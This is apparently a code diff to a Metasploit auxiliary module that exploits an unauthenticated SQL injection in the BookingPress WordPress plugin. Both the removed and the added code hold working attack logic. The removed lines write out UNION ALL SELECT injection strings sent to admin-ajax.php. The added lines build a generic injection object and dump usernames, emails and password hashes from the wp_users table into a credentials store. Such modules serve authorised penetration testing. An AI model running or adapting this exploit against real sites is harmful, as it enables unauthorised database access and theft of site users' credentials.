@@ -7,6 +7,7 @@ class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::SQLi
   prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
@@ -39,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      OptString.new('TARGETURI',[ true, 'The webpage that bookingPress is running on', '/bookingpress/' ])
+      OptString.new('TARGETURI', [ true, 'The webpage that bookingPress is running on', '/bookingpress/' ])
     ])
   end
 
@@ -47,32 +48,11 @@ class MetasploitModule < Msf::Auxiliary
     @nonce = get_user_nonce
     return Exploit::CheckCode::Unknown if @nonce == 'Unable to get wp-nonce for an unauthenticated user'
 
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
-      'vars_post' =>
-          generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
-    })
+    @sqli = get_sqli_object
 
-    return Exploit::CheckCode::Vulnerable if res&.code == 200 && res.body.include?('bookingpress_service_position')
+    return Exploit::CheckCode::Vulnerable if @sqli.test_vulnerable
 
     Exploit::CheckCode::Safe
-  end
-
-  def get_number_of_users
-    res = send_request_cgi({
-      'method' => 'POST',
-      'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
-      'vars_post' =>
-         generate_vars_post(') UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -')
-    })
-
-    fail_with(Failure::UnexpectedReply, 'There was no response when attempting to extract the number of users from the database') if res.nil?
-
-    number_of_users = res.get_json_document[0]['bookingpress_service_position'].to_i
-    fail_with(Failure::UnexpectedReply, 'Unable to extract the number of users from the database') unless number_of_users.is_a? Integer
-
-    number_of_users
   end
 
   def generate_vars_post(sqli)
@@ -82,6 +62,18 @@ class MetasploitModule < Msf::Auxiliary
       'category_id' => 1,
       'total_service' => "#{rand(100..10000)}#{sqli}"
     }
+  end
+
+  def get_sqli_object
+    create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
+        'vars_post' =>
+                                 generate_vars_post(") UNION ALL SELECT (#{payload}),456,789,12,34,56,78,90,77 from wp_users-- -")
+      })
+      res.get_json_document[0]['bookingpress_service_id']
+    end
   end
 
   def get_user_nonce
@@ -97,10 +89,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def run
     @nonce ||= get_user_nonce
+    @sqli ||= get_sqli_object
     fail_with(Failure::UnexpectedReply, 'Unable to get wp-nonce for an unauthenticated user') if @nonce == 'Unable to get wp-nonce for an unauthenticated user'
-    number_of_users = get_number_of_users
-    print_status("Found #{number_of_users} users in the database")
-    i = 0
 
     creds_table = Rex::Text::Table.new(
       'Header' => 'Wordpress User Credentials',
@@ -109,25 +99,9 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     print_status('Extracting credential information')
-    while i < number_of_users
-      res = send_request_cgi({
-        'method' => 'POST',
-        'uri' => normalize_uri('/wp-admin/admin-ajax.php'),
-        'vars_post' => generate_vars_post(") UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset #{i}-- -")
-      })
+    users = @sqli.dump_table_fields('wp_users', %w[user_login user_email user_pass])
 
-      fail_with(Failure::UnexpectedReply, 'There was no response when attempting to extract credentials from the database') if res.nil?
-
-      fail_with(Failure::UnexpectedReply, 'Unable to retrieve JSON response from SQL injection') unless res.get_json_document[0].is_a? Hash
-      parsed_json = JSON.parse(res&.body)[0]
-
-      unless parsed_json.key?('bookingpress_service_id') && parsed_json.key?('bookingpress_category_id') && parsed_json.key?('bookingpress_service_name')
-        fail_with(Failure::Unknown, 'Invalid JSON returned from SQL injection')
-      end
-
-      username = parsed_json['bookingpress_service_id']
-      email = parsed_json['bookingpress_category_id']
-      hash = parsed_json['bookingpress_service_name']
+    users.each do |(username, email, hash)|
       creds_table << [username, email, hash]
       create_credential({
         workspace_id: myworkspace_id,
@@ -144,8 +118,6 @@ class MetasploitModule < Msf::Auxiliary
         status: Metasploit::Model::Login::Status::UNTRIED,
         email: email
       })
-
-      i += 1
     end
     print_line creds_table.to_s
   end
